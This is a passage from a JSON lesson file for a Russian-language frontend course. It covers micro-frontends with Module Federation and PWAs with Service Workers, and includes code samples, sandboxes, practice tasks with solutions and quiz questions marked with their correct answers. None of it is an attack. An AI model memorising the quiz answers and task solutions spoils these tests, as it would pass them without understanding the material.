            "code": "// Компонент безопасной обертки удаленного микрофронтенда с Fallback\nimport React from 'react';\n\ninterface MfeContainerProps {\n  title: string;\n  children: React.ReactNode;\n}\n\nexport class MfeErrorBoundary extends React.Component<MfeContainerProps, { hasError: boolean }> {\n  state = { hasError: false };\n\n  static getDerivedStateFromError() {\n    return { hasError: true };\n  }\n\n  componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {\n    console.error(`[MFE Failure] Сбой в микрофронтенде ${this.props.title}:`, error, errorInfo);\n    // Отправка метрики в Sentry с тегом конкретного MFE\n  }\n\n  render() {\n    if (this.state.hasError) {\n      return (\n        <div className=\"mfe-fallback-card\">\n          <h4>⚠️ Модуль «{this.props.title}» временно недоступен</h4>\n          <button onClick={() => this.setState({ hasError: false })}>Повторить попытку</button>\n        </div>\n      );\n    }\n    return this.props.children;\n  }\n}",
            "title": "MfeErrorBoundary: защита от каскадного падения приложения",
            "explanation": "Сбой в одном удаленном микрофронтенде изолируется локальной плашкой с кнопкой повтора, сохраняя остальной интерфейс работоспособным."
          }
        }
      ],
      "seniorTips": [
        "Не внедряйте микрофронтенды в небольших проектах (до 30 разработчиков) — сложность инфраструктуры, версионирования и отладки превысит выгоду от независимых релизов.",
        "Всегда настраивайте `react` и `react-dom` как `singleton: true` в конфиге Module Federation — дублирование экземпляров React ломает хуки и контексты.",
        "Оборачивайте каждый удаленный микрофронтенд в отдельный `ErrorBoundary` и `Suspense` на уровне Host Shell — это гарантирует отказоустойчивость всей системы.",
        "Для стилей используйте CSS Modules или Tailwind с уникальным префиксом классов — это на 100% исключает конфликты глобальных стилей между командами."
      ],
      "commonMistakes": [
        {
          "bad": "// Забытый флаг singleton: true для React в Module Federation\nshared: ['react', 'react-dom'] // ❌ Браузер загрузит 2 копии React: ошибка 'Invalid hook call'!",
          "good": "shared: { react: { singleton: true, requiredVersion: '^18.0.0' } }",
          "reason": "React строго требует единого экземпляра в памяти приложения. Без singleton хуки useState и useContext падают с фатальной ошибкой."
        },
        {
          "bad": "// Прямой вызов глобальных функций чужого микрофронтенда: window.catalogMfe.addToCart()",
          "good": "// Общение через типизированные Custom Events или Event Bus",
          "reason": "Прямые вызовы создают хрупкую связность: при изменении имени метода в удаленном модуле все зависимые микрофронтенды сломаются."
        },
        {
          "bad": "// Использование iFrames для всего сайта вместо Module Federation",
          "good": "// Module Federation для нативного бесшовного UI и единого контекста авторизации",
          "reason": "iFrames вызывают проблемы с мобильной адаптивностью, SEO, синхронизацией истории переходов и рендерингом всплывающих модальных окон."
        }
      ],
      "keyTakeaways": [
        "Микрофронтенды разделяют крупный монолит на автономные приложения для независимого деплоя командами.",
        "Module Federation — индустриальный стандарт рантайм-интеграции модулей с общим шарингом зависимостей.",
        "Флаг `singleton: true` исключает дублирование React и библиотек в памяти браузера.",
        "Изоляция стилей достигается через CSS Modules, Shadow DOM или префиксы Tailwind.",
        "ErrorBoundary защищает Host Shell от каскадного падения при сбое в одном микрофронтенде."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"mfe-sandbox-app\">\n  <h3>Симулятор Module Federation (Host & Remote)</h3>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px;\">\n    <button id=\"btn-load-remote\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">1. Загрузить remoteEntry.js (Каталог)</button>\n    <button id=\"btn-crash-remote\" style=\"background:#f85149; color:#fff; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">2. Симулировать сбой MFE</button>\n  </div>\n  <div id=\"mfe-container\" style=\"border:1px dashed #30363d; padding:16px; border-radius:8px; background:#161b22;\">\n    <span style=\"color:#8b949e;\">Host Shell: Ожидание подключения Remote-модуля...</span>\n  </div>\n</div>",
      "initialCss": "#mfe-sandbox-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const container = document.getElementById('mfe-container');\n\ndocument.getElementById('btn-load-remote').onclick = () => {\n  container.innerHTML = '<span style=\"color:#ffb02e;\">⏳ Загрузка манифеста https://catalog.store.dev/remoteEntry.js (2.4 KB)...</span>';\n  setTimeout(() => {\n    container.innerHTML = `\n      <div style=\"border:1px solid #2dff8a; padding:12px; border-radius:6px;\">\n        <div style=\"display:flex; justify-content:space-between; align-items:center;\">\n          <b style=\"color:#2dff8a;\">📦 Remote MFE: ProductCatalog (v2.4.0)</b>\n          <span style=\"font-size:10px; background:#2dff8a22; color:#2dff8a; padding:2px 6px; border-radius:4px;\">Shared React: Singleton OK</span>\n        </div>\n        <p style=\"color:#8b949e; font-size:12px; margin:8px 0;\">Витрина товаров отрендерена независимо из удаленного CDN!</p>\n        <button style=\"background:#29e7ff; color:#0a0e13; border:none; padding:4px 8px; font-weight:bold; font-size:11px;\">Купить курс (15 000 ₽)</button>\n      </div>\n    `;\n  }, 400);\n};\n\ndocument.getElementById('btn-crash-remote').onclick = () => {\n  container.innerHTML = `\n    <div style=\"border:1px solid #f85149; padding:12px; border-radius:6px; background:#f8514911;\">\n      <b style=\"color:#f85149;\">🛡️ [ErrorBoundary]: Микрофронтенд временно недоступен</b>\n      <p style=\"color:#8b949e; font-size:12px; margin:6px 0;\">Сбой изолирован! Остальное приложение (шапка, навигация, профиль) продолжает работать штатно.</p>\n      <button onclick=\"document.getElementById('btn-load-remote').click()\" style=\"background:#30363d; color:#fff; border:none; padding:4px 8px; font-size:11px; cursor:pointer;\">Перезагрузить модуль</button>\n    </div>\n  `;\n};",
      "instructions": "Практика с микрофронтендами:\n1. Нажмите '1. Загрузить remoteEntry.js' — Host Shell динамически смонтирует удаленный MFE\n2. Нажмите '2. Симулировать сбой MFE' — ErrorBoundary изолирует падение, не ломая все приложение"
    },
    "task": {
      "title": "Настройка конфигурации Webpack Module Federation для Host и Remote приложений",
      "scenario": "Настройте ModuleFederationPlugin для микрофронтенда корзины (Remote) и главного приложения (Host): Remote должен экспортировать компонент ./MiniCart и хук ./useCart, а Host должен подключать remoteEntry.js корзины. Оба приложения должны шарить react и react-dom как singleton с версией ^18.2.0.",
      "criteria": [
        "В Remote объявлены name, filename ('remoteEntry.js') и exposes для MiniCart и useCart",
        "В Host настроен блок remotes с указанием адреса remoteEntry корзины",
        "В обоих приложениях настроен блок shared с react и react-dom (singleton: true)",
        "Конфигурация соответствует спецификации Webpack 5 Module Federation"
      ],
      "starterCode": {
        "js": "// Настройте конфигурацию Module Federation для Remote и Host\nconst { ModuleFederationPlugin } = require('webpack').container;\n\n// 1. Конфиг Remote (Корзина)\nconst remoteConfig = {\n  // Ваш код\n};\n\n// 2. Конфиг Host (Shell)\nconst hostConfig = {\n  // Ваш код\n};"
      },
      "hints": [
        "exposes: { './MiniCart': './src/MiniCart', './useCart': './src/useCart' }",
        "remotes: { cart_mfe: 'cart_mfe@https://cart.domain.com/remoteEntry.js' }",
        "shared: { react: { singleton: true, requiredVersion: '^18.2.0' }, 'react-dom': { singleton: true } }"
      ],
      "solution": {
        "js": "const { ModuleFederationPlugin } = require('webpack').container;\n\n// 1. Конфигурация Remote (Микрофронтенд Корзины)\nconst remoteConfig = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'cart_mfe',\n      filename: 'remoteEntry.js',\n      exposes: {\n        './MiniCart': './src/components/MiniCart.tsx',\n        './useCart': './src/hooks/useCart.ts',\n      },\n      shared: {\n        react: { singleton: true, requiredVersion: '^18.2.0' },\n        'react-dom': { singleton: true, requiredVersion: '^18.2.0' },\n      },\n    }),\n  ],\n};\n\n// 2. Конфигурация Host (Главная оболочка Shell)\nconst hostConfig = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'host_shell',\n      remotes: {\n        cart_mfe: 'cart_mfe@https://cart.domain.com/remoteEntry.js',\n      },\n      shared: {\n        react: { singleton: true, requiredVersion: '^18.2.0' },\n        'react-dom': { singleton: true, requiredVersion: '^18.2.0' },\n      },\n    }),\n  ],\n};\n\nconsole.log('Архитектура Module Federation успешно сконфигурирована!');",
        "explanation": "Конфигурация обеспечивает независимый деплой микрофронтенда корзины с экспортом компонентов и единым экземпляром React Singleton на уровне браузера."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro16-q1",
          "question": "Команда из шести человек хочет перейти на микрофронтенды. Что стоит учесть в первую очередь?",
          "options": [
            "Это верное решение: архитектура одинаково полезна при любом размере команды",
            "Переход невозможен технически: потребуется минимум три отдельных репозитория",
            "Издержки на инфраструктуру, версии и отладку превысят выгоду на таком размере",
            "Придётся отказаться от TypeScript: типы не переносятся между разными сборками"
          ],
          "correctIndex": 2,
          "explanation": "Микрофронтенды решают организационную проблему: десятки команд мешают друг другу в общем репозитории и не могут выпускаться независимо. Шести человек эта проблема не касается, зато они получат несколько конвейеров сборки, согласование версий общих зависимостей, распределённую отладку и заметно более сложный запуск проекта локально. Для такого размера монолит с хорошей внутренней архитектурой выгоднее."
        },
        {
          "id": "pro16-q2",
          "question": "Почему React настраивают как единственный разделяемый экземпляр в Module Federation?",
          "options": [
            "Иначе размер итоговой сборки вырастет вдвое из-за дублирования одной и той же библиотеки",
            "Два экземпляра в памяти ломают хуки и контексты: внутреннее состояние живёт в модуле",
            "Иначе версии в разных модулях начнут обновляться независимо друг от друга",
            "Так требует спецификация сборщика применительно ко всем зависимостям без исключения"
          ],
          "correctIndex": 1,
          "explanation": "Библиотека хранит текущий обрабатываемый компонент в собственном модульном состоянии. Если экземпляров два, компонент из удалённого модуля вызывает хук у одной копии, а дерево отрисовывает другая — отсюда знаменитая ошибка о недопустимом вызове хука. По той же причине контекст, созданный в одном экземпляре, невидим для другого. Лишний вес — неприятное, но куда менее серьёзное последствие."
        },
        {
          "id": "pro16-q3",
          "question": "Что представляет собой файл входной точки удалённого модуля?",
          "options": [
            "Собранный бандл модуля целиком, который хост скачивает при загрузке страницы",
            "Манифест: перечень предоставляемых наружу компонентов и список общих зависимостей",
            "Конфигурация сборщика, копируемая в хост-приложение на этапе его сборки",
            "Файл стилей модуля, изолированный от глобального оформления хост-приложения"
          ],
          "correctIndex": 1,
          "explanation": "Это небольшой файл, который хост загружает первым: он описывает, какие компоненты модуль выставляет наружу и какие библиотеки готов разделить. Дальше происходит согласование версий общих зависимостей, и только затем по требованию подтягивается код нужного компонента. Такая двухступенчатая схема позволяет обновлять удалённый модуль без пересборки хоста — в этом и весь смысл интеграции во время работы."
        },
        {
          "id": "pro16-q4",
          "question": "Как организовать обмен данными между микрофронтендами, сохранив слабую связанность?",
          "options": [
            "Обмениваться типизированными событиями браузера либо передавать состояние через адрес",
            "Вызывать методы соседнего модуля напрямую через свойства глобального объекта окна",
            "Держать общий изменяемый объект в глобальной области и читать значения из него",
            "Связывать модули нельзя: каждый обязан работать полностью автономно от других"
          ],
          "correctIndex": 0,
          "explanation": "Прямые вызовы возвращают ровно ту связанность, ради избавления от которой всё и затевалось: переименование метода в одном модуле ломает соседей, выпускаемых другой командой. События дают контракт, не зависящий от внутренней реализации, а описание их полезной нагрузки удобно вынести в общий пакет типов. Состояние, которое должно переживать перезагрузку, лучше держать в адресе страницы."
        },
        {
          "id": "pro16-q5",
          "question": "Один из удалённых модулей падает с ошибкой при отрисовке. Что даёт граница ошибок вокруг него?",
          "options": [
            "Упадёт только этот блок, а остальное приложение продолжит нормально работать",
            "Ошибка будет автоматически исправлена повторной попыткой отрисовки этого модуля",
            "Ошибка отправится в систему мониторинга, но отрисовка всё равно прервётся полностью",
            "Модуль подменится предыдущей стабильной версией, сохранённой в кеше браузера"
          ],
          "correctIndex": 0,
          "explanation": "Без такой границы исключение при отрисовке размонтирует всё дерево, и сбой в блоке рекомендаций унесёт с собой корзину и оформление заказа. Обёртка перехватывает ошибку, показывает запасной интерфейс на месте упавшего блока и оставляет остальную страницу живой. Вместе с ней обычно ставят границу ожидания на время подгрузки модуля и отправку ошибки в мониторинг — но восстанавливать модуль сама она не умеет."
        }
      ]
    }
  },
  {
    "id": "pro-17",
    "moduleId": "pro",
    "level": 17,
    "title": "Прогрессивные веб-приложения (PWA), Service Workers и Offline-First архитектура",
    "subtitle": "Web App Manifest, жизненный цикл Service Worker, 5 стратегий кэширования (Workbox), Background Sync и Push API",
    "description": "Освойте разработку прогрессивных веб-приложений (PWA): создание Web App Manifest для установки приложения на рабочий стол, архитектуру программируемого сетевого прокси Service Worker, 5 стратегий кэширования (Cache-First, Network-First, Stale-While-Revalidate), синхронизацию данных в оффлайне через Background Sync API и доставку Web Push уведомлений.",
    "estimatedMinutes": 75,
    "difficulty": "advanced",
    "tags": [
      "pwa",
      "service-worker",
      "offline-first",
      "cache-api",
      "manifest",
      "workbox",
      "background-sync",
      "push-notifications",
      "web-apis"
    ],
    "theory": {
      "overview": "Пользователи ожидают, что веб-приложение будет работать так же надежно, быстро и плавно, как нативное мобильное приложение — даже при нестабильной связи в метро или полном отсутствии интернета (**Offline-First**).\n\n**Прогрессивные веб-приложения (PWA)** стирают грань между сайтами и нативными приложениями: они устанавливаются на главный экран смартфона/десктопа в один клик без App Store, мгновенно открываются из локального кэша за 50 мс и могут отправлять фоновые данные через **Service Workers**.\n\nВ этом уроке мы разберём жизненный цикл Service Worker, 5 стратегий кэширования и построение отказоустойчивых PWA.",
      "sections": [
        {
          "title": "Что такое PWA и анатомия Web App Manifest (manifest.json)",
          "content": "Превращение веб-сайта в устанавливаемое приложение:\n\n1. **Три столпа PWA**:\n- **Capable (Функциональное)**: доступ к современным Web APIs (камера, геолокация, Push-уведомления, файловая система).\n- **Reliable (Надежное)**: мгновенная загрузка и работа без интернета благодаря Service Worker.\n- **Installable (Устанавливаемое)**: запуск в отдельном окне без адресной строки браузера как нативное приложение.\n\n2. **Структура `manifest.json`**:\n- `name` и `short_name` — название под иконкой на рабочем столе.\n- `icons` — массив иконок (192x192, 512x512, с маской `purpose: \"maskable\"`).\n- `start_url` — стартовый URL при открытии.\n- `display: \"standalone\"` — скрывает адресную строку и кнопки браузера!\n- `theme_color` и `background_color` — цвет статус-бара и сплеш-скрина.\n\n3. **Событие `beforeinstallprompt`**:\n- Позволяет перехватить стандартный системный баннер и показать красивую кастомную кнопку «Установить на телефон».",
          "image": {
            "src": "/images/lessons/web-pwa-service-workers.svg",
            "alt": "PWA, Service Workers и 5 стратегий кэширования",
            "caption": "PWA архитектура: Web App Manifest, жизненный цикл Service Worker (install, activate, fetch) и 5 стратегий кэширования"
          },
          "codeExample": {
            "language": "json",
            "code": "{\n  \"name\": \"Frontend Intern Academy PWA\",\n  \"short_name\": \"Academy\",\n  \"description\": \"Интерактивная платформа обучения фронтенд-разработке\",\n  \"start_url\": \"/\",\n  \"display\": \"standalone\",\n  \"background_color\": \"#0a0e13\",\n  \"theme_color\": \"#2dff8a\",\n  \"icons\": [\n    {\n      \"src\": \"/icons/icon-192.png\",\n      \"sizes\": \"192x192\",\n      \"type\": \"image/png\",\n      \"purpose\": \"any maskable\"\n    },\n    {\n      \"src\": \"/icons/icon-512.png\",\n      \"sizes\": \"512x512\",\n      \"type\": \"image/png\"\n    }\n  ]\n}",
            "title": "Манифест веб-приложения public/manifest.json",
            "explanation": "Манифест сообщает операционной системе (Android, iOS, Windows), как отображать приложение при установке на рабочий стол."
          }
        },
        {
          "title": "Архитектура и жизненный цикл Service Worker",
          "content": "Service Worker — это программируемый сетевой прокси, работающий в фоновом потоке:\n\n1. **Особенности Service Worker**:\n- Работает **ТОЛЬКО по HTTPS** (для безопасности, на localhost работает по HTTP).\n- Не имеет прямого доступа к DOM-дереву (общается с UI через `postMessage`).\n- Живет отдельно от страницы: продолжает работать даже когда вкладка закрыта.\n\n2. **Жизненный цикл (Lifecycle)**:\n- **1. Регистрация (`navigator.serviceWorker.register('/sw.js')`)**.\n- **2. Событие `install`**:\n  Срабатывает один раз при установке новой версии скрипта. Здесь кэшируется базовый каркас приложения (App Shell: `index.html`, стили, логотипы) через `caches.open('app-shell-v1').addAll([...])`.\n  Вызов `self.skipWaiting()` заставляет воркер активироваться немедленно.\n- **3. Событие `activate`**:\n  Срабатывает после установки. Здесь **удаляются старые версии кэша** (`caches.delete(oldCacheKey)`).\n  Вызов `self.clients.claim()` берет под контроль все открытые вкладки.\n- **4. Событие `fetch`**:\n  Перехватывает **КАЖДЫЙ сетевой HTTP-запрос** от страницы к серверу!",
          "codeExample": {
            "language": "javascript",
            "code": "// public/sw.js — базовый Service Worker с кэшированием App Shell\nconst CACHE_NAME = 'intern-academy-v1.0.0';\nconst STATIC_ASSETS = ['/', '/index.html', '/src/index.css', '/icons/icon-192.png'];\n\n// 1. Фаза установки: предзагрузка статики в Cache Storage\nself.addEventListener('install', (event) => {\n  console.log('[SW] Установка новой версии...');\n  event.waitUntil(\n    caches.open(CACHE_NAME).then((cache) => cache.addAll(STATIC_ASSETS))\n  );\n  self.skipWaiting(); // Активироваться немедленно\n});\n\n// 2. Фаза активации: удаление устаревших версий кэша\nself.addEventListener('activate', (event) => {\n  console.log('[SW] Активация...');\n  event.waitUntil(\n    caches.keys().then((keys) =>\n      Promise.all(\n        keys.map((key) => {\n          if (key !== CACHE_NAME) {\n            console.log('[SW] Удаление старого кэша:', key);\n            return caches.delete(key);\n          }\n        })\n      )\n    )\n  );\n  return self.clients.claim();\n});",
            "title": "Жизненный цикл Service Worker: install и activate с очисткой старого кэша",
            "explanation": "При выкатке новой версии старый кэш удаляется в фазе activate, предотвращая засорение памяти устройства."
          }
        },
        {
          "title": "5 Промышленных стратегий кэширования (Workbox / Cache API)",
          "content": "Как отвечать на сетевые запросы в событии `fetch`:\n\n1. **Cache-First (Сначала кэш, затем сеть)**:\n- Сначала ищет ответ в кэше. Если нашел — отдает за 0 мс. Если нет — идет в сеть и сохраняет в кэш.\n- **Для чего**: шрифты, иконки, статичные картинки, хешированные JS/CSS бандлы.\n\n2. **Network-First (Сначала сеть, при сбое — кэш)**:\n- Идет в сеть. Если интернет есть — отдает свежие данные и обновляет кэш. Если оффлайн (сбой сети) — отдает закешированный запасной ответ.\n- **Для чего**: баланс счета, профиль пользователя, список заказов.\n\n3. **Stale-While-Revalidate (Старый кэш + фоновое обновление)**:\n- Мгновенно отдает пользователю имеющийся кэш, а в фоне тихо делает запрос в сеть и обновляет кэш для следующего раза.\n- **Для чего**: ленты новостей, статьи блога, список курсов.\n\n4. **Network-Only**: только сеть (платежи, отправка паролей).\n5. **Cache-Only**: только локальный оффлайн-кэш.",
          "codeExample": {
            "language": "javascript",
            "code": "// Реализация стратегии Stale-While-Revalidate в перехватчике fetch\nself.addEventListener('fetch', (event) => {\n  // Перехватываем только GET-запросы\n  if (event.request.method !== 'GET') return;\n\n  event.respondWith(\n    caches.open(CACHE_NAME).then(async (cache) => {\n      // 1. Ищем ответ в локальном кэше\n      const cachedResponse = await cache.match(event.request);\n\n      // 2. Фоновый запрос к реальной сети для обновления кэша\n      const networkFetch = fetch(event.request).then((networkResponse) => {\n        if (networkResponse && networkResponse.status === 200) {\n          // Клонируем ответ (stream можно прочитать только 1 раз!)\n          cache.put(event.request, networkResponse.clone());\n        }\n        return networkResponse;\n      }).catch(() => {\n        // Оффлайн: сеть недоступна, ничего страшного\n        console.log('[SW] Оффлайн режим для:', event.request.url);\n      });\n\n      // 3. Возвращаем кэш мгновенно (если есть), иначе ждем сеть\n      return cachedResponse || networkFetch;\n    })\n  );\n});",
            "title": "Стратегия Stale-While-Revalidate на чистом Cache API",
            "explanation": "Пользователь получает контент мгновенно за 0 мс из кэша, пока Service Worker в фоне обновляет копию из сети."
          }
        },
        {
          "title": "Background Sync, Push API и Оффлайн-очереди",
          "content": "Продвинутые возможности Offline-First архитектуры:\n\n1. **Background Sync API**:\n- Пользователь пишет сообщение или ставит лайк в метро без интернета.\n- Приложение сохраняет действие в локальную базу данных **IndexedDB** и регистрирует фоновую задачу: `registration.sync.register('sync-likes')`.\n- Как только смартфон поймает связь (даже если браузер уже закрыт!), Service Worker проснется и отправит накопленные запросы на сервер!\n\n2. **Push Notifications API**:\n- Сервер отправляет зашифрованное веб-пуш сообщение через VAPID-ключи.\n- Service Worker перехватывает событие `self.addEventListener('push', ...)` и вызывает нативный диалог `self.registration.showNotification('Новый урок!', { icon, body })`.",
          "codeExample": {
            "language": "javascript",
            "code": "// sw.js — Обработка фоновой синхронизации (Background Sync)\nself.addEventListener('sync', (event) => {\n  if (event.tag === 'sync-offline-forms') {\n    console.log('[SW] Сеть восстановилась! Отправка накопленных оффлайн-заявок...');\n    event.waitUntil(sendPendingFormsFromIndexedDB());\n  }\n});\n\n// sw.js — Перехват Web Push уведомлений\nself.addEventListener('push', (event) => {\n  const data = event.data ? event.data.json() : { title: 'Уведомление', body: 'Новое событие' };\n  \n  event.waitUntil(\n    self.registration.showNotification(data.title, {\n      body: data.body,\n      icon: '/icons/icon-192.png',\n      badge: '/icons/badge.png',\n    })\n  );\n});",
            "title": "События sync и push в Service Worker",
            "explanation": "Background Sync отправляет оффлайн-очередь при восстановлении сети, а Push API показывает нативные уведомления."
          }
        }
      ],
      "seniorTips": [
        "При разработке всегда используйте правильные стратегии: Cache-First для статических ассетов с хешами, Network-First для персональных данных, Stale-While-Revalidate для публичного контента.",
        "Не кэшируйте ответы с ошибками (HTTP 4xx/5xx) или запросы с методом POST/PUT — кэшируйте только успешные GET-запросы со статусом 200.",
        "Всегда вызывайте `networkResponse.clone()` перед сохранением в `cache.put()` — тело HTTP-ответа является ReadableStream и может быть прочитано только один раз.",
        "Для удобной работы с PWA в продакшене используйте библиотеку **Workbox** (от команды Google) или плагин `vite-plugin-pwa` — они автоматизируют генерацию Service Worker и стратегии кэширования."
      ],
      "commonMistakes": [
        {
          "bad": "// Забытый clone() ответа перед записью в кэш\ncache.put(event.request, networkResponse); // ❌ Ошибка: response body is already used!",
          "good": "cache.put(event.request, networkResponse.clone());",
          "reason": "Поток ответа (Stream) может быть прочитан только единожды. Метод .clone() создает дубликат для записи в Cache Storage."
        },
        {
          "bad": "// Кэширование файла sw.js браузерным HTTP-кэшем на 1 год\nCache-Control: max-age=31536000 для /sw.js",
          "good": "// Для sw.js ВСЕГДА устанавливается Cache-Control: no-cache, max-age=0",
          "reason": "Если закешировать сам файл sw.js, браузер никогда не узнает о выходе новой версии воркера и сайт застрянет на старом коде."
        },
        {
          "bad": "// Хранение паролей и конфиденциальных токенов в Cache API без шифрования",
          "good": "// Использование HttpOnly cookies и исключение закрытых эндпоинтов из Service Worker кэша",
          "reason": "Cache API доступен из любого скрипта на клиенте и не предназначен для хранения секретных данных."
        }
      ],
      "keyTakeaways": [
        "PWA превращает веб-сайт в устанавливаемое приложение с поддержкой оффлайн-режима.",
        "manifest.json настраивает иконки, цвета темы и standalone-режим отображения.",
        "Service Worker — программируемый сетевой прокси, работающий в фоновом потоке.",
        "5 стратегий кэширования (Cache-First, Network-First, Stale-While-Revalidate) оптимизируют работу с сетью.",
        "Background Sync отправляет данные из оффлайн-очереди при появлении интернета."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"pwa-sandbox-app\">\n  <h3>PWA & Service Worker Симулятор</h3>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px;\">\n    <button id=\"btn-sw-register\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">1. Зарегистрировать SW</button>\n    <button id=\"btn-sw-offline\" style=\"background:#ffb02e; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">2. Режим «В самолете (Offline)»</button>\n  </div>\n  <pre id=\"sw-log\" style=\"color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px;\"></pre>\n</div>",
      "initialCss": "#pwa-sandbox-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const log = document.getElementById('sw-log');\nlet isOffline = false;\n\ndocument.getElementById('btn-sw-register').onclick = () => {\n  log.textContent = '⚙️ [SW Lifecycle]:\\n';\n  log.textContent += '1. navigator.serviceWorker.register(\"/sw.js\") — OK\\n';\n  log.textContent += '2. [install] Кэширование App Shell: index.html, main.css, icon-192.png (12 ассетов)\\n';\n  log.textContent += '3. [activate] Очистка старых кэшей + clients.claim()\\n';\n  log.textContent += '✅ Service Worker активен и готов перехватывать fetch-запросы 🚀';\n  log.style.color = '#2dff8a';\n};\n\ndocument.getElementById('btn-sw-offline').onclick = () => {\n  isOffline = !isOffline;\n  log.textContent = isOffline \n    ? '✈️ [Режим Offline включен]:\\n> GET /api/lessons\\n⚡ [Cache-First]: Запрос перехвачен Service Worker!\\n📦 Отдан закешированный ответ из Cache Storage (0 мс, 0 байт трафика)\\n🎉 Сайт 100% функционален без интернета!'\n    : '🌐 [Режим Online]: Подключение к интернету восстановлено.';\n  log.style.color = isOffline ? '#ffb02e' : '#2dff8a';\n};",
      "instructions": "Практика с PWA и Service Worker:\n1. Нажмите '1. Зарегистрировать SW' для симуляции фаз install и activate\n2. Нажмите '2. Режим Offline' — Service Worker перехватит запрос и мгновенно отдаст данные из Cache Storage"
    },
    "task": {
      "title": "Разработка Service Worker со стратегией Network-First и запасным оффлайн-кэшем",
      "scenario": "Создайте скрипт sw.js для новостного портала: воркер должен кэшировать базовые ассеты в фазе install, очищать старые кэши в activate, и реализовывать стратегию Network-First для запросов статей (пытается загрузить свежие данные из сети, а при сбое или отсутствии интернета отдает сохраненную копию из кэша).",
      "criteria": [
        "Реализованы обработчики событий install (addAll статики) и activate (очистка устаревших кэшей)",
        "В событии fetch реализована стратегия Network-First",
        "При успешном сетевом ответе кэш обновляется через cache.put(event.request, res.clone())",
        "При оффлайн-сбое возвращается сохраненный кэш из caches.match(event.request)"
      ],
      "starterCode": {
        "js": "// Реализуйте sw.js со стратегией Network-First\nconst CACHE_NAME = 'news-v1';\n// Ваш код"
      },
      "hints": [
        "В обработчике install соберите список базовых ассетов и положите их разом: caches.open(CACHE).then(c => c.addAll(ASSETS)). Вызов self.skipWaiting() позволит новому воркеру активироваться, не дожидаясь закрытия вкладок.",
        "В обработчике activate переберите caches.keys() и удалите все хранилища, имя которых не совпадает с текущей версией. Завершите его вызовом self.clients.claim(), чтобы воркер сразу начал обслуживать открытые страницы.",
        "Стратегия Network-First строится так: event.respondWith(fetch(event.request).then(res => { ... }).catch(() => caches.match(event.request)))",
        "Перед записью в кэш обязательно клонируйте ответ: тело — это поток, который читается лишь один раз. В кэш кладите res.clone(), а наружу возвращайте оригинальный res.",
        "Кэшируйте только успешные GET-запросы: проверяйте event.request.method === 'GET' и res.ok, иначе в хранилище осядут страницы ошибок и ответы на отправку форм."
      ],
      "solution": {
        "js": "const CACHE_NAME = 'news-cache-v1';\nconst STATIC_ASSETS = ['/', '/index.html', '/styles.css', '/app.js'];\n\n// 1. Установка и кэширование статики\nself.addEventListener('install', (event) => {\n  event.waitUntil(\n    caches.open(CACHE_NAME).then((cache) => cache.addAll(STATIC_ASSETS))\n  );\n  self.skipWaiting();\n});\n\n// 2. Активация и удаление старых версий кэша\nself.addEventListener('activate', (event) => {\n  event.waitUntil(\n    caches.keys().then((keys) =>\n      Promise.all(\n        keys.map((key) => {\n          if (key !== CACHE_NAME) return caches.delete(key);\n        })\n      )\n    )\n  );\n  self.clients.claim();\n});\n\n// 3. Стратегия Network-First для свежих новостей с оффлайн-фолбеком\nself.addEventListener('fetch', (event) => {\n  if (event.request.method !== 'GET') return;\n\n  event.respondWith(\n    fetch(event.request)\n      .then(async (networkResponse) => {\n        if (networkResponse && networkResponse.status === 200) {\n          const cache = await caches.open(CACHE_NAME);\n          cache.put(event.request, networkResponse.clone());\n        }\n        return networkResponse;\n      })\n      .catch(async () => {\n        // Оффлайн сбой: отдаем закешированную копию\n        const cached = await caches.match(event.request);\n        if (cached) return cached;\n        throw new Error('Ресурс недоступен в оффлайне');\n      })\n  );\n});\n\nconsole.log('Network-First Service Worker успешно зарегистрирован!');",
        "explanation": "Скрипт обеспечивает максимальную актуальность новостей при наличии сети и бесшовный показ закешированных статей при потере связи."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro17-q1",
          "question": "Внутри Service Worker попытались обратиться к `document.querySelector`. Что произойдёт?",
          "options": [
            "Код отработает: воркер имеет полный доступ к документу своей страницы",
            "Ошибка: воркер живёт в отдельном контексте без доступа к дереву документа",
            "Вернётся пустой результат: документ становится доступен только после активации",
            "Обращение будет перенаправлено в главный поток и выполнится асинхронно"
          ],
          "correctIndex": 1,
          "explanation": "Воркер выполняется в собственном глобальном контексте, где нет ни объекта окна, ни документа: он видит запросы, кеш, события и клиентов, но не элементы страницы. Это осознанное ограничение — один воркер обслуживает сразу несколько вкладок и переживает их закрытие. Чтобы что-то сообщить странице, ему нужно отправить сообщение конкретному клиенту, а тот уже изменит документ."
        },
        {
          "id": "pro17-q2",
          "question": "Для каких ресурсов подходит стратегия «сначала кеш»?",
          "options": [
            "Для баланса счёта и других персональных данных пользователя",
            "Для ленты новостей, которая обновляется каждые несколько минут",
            "Для файлов с хешем в имени: шрифтов, логотипов и собранных скриптов",
            "Для отправки форм, чтобы данные не потерялись при обрыве связи"
          ],
          "correctIndex": 2,
          "explanation": "Стратегия отдаёт сохранённую копию, не обращаясь к сети вовсе, поэтому подходит там, где содержимое по адресу измениться не может: имя файла с хешем меняется вместе с содержимым, значит старая копия всегда актуальна. Персональные данные требуют обратного порядка — сначала сеть, кеш лишь как запасной вариант. Для регулярно обновляемого содержимого берут отдачу из кеша с фоновым обновлением."
        },
        {
          "id": "pro17-q3",
          "question": "Почему этот обработчик сломается и как его починить?",
          "codeSnippet": "const res = await fetch(request);\ncache.put(request, res);\nreturn res;",
          "options": [
            "Ответ нельзя сохранять до проверки статуса; поможет условие на успешность запроса",
            "Метод записи асинхронный: не хватает ожидания перед возвратом ответа наружу",
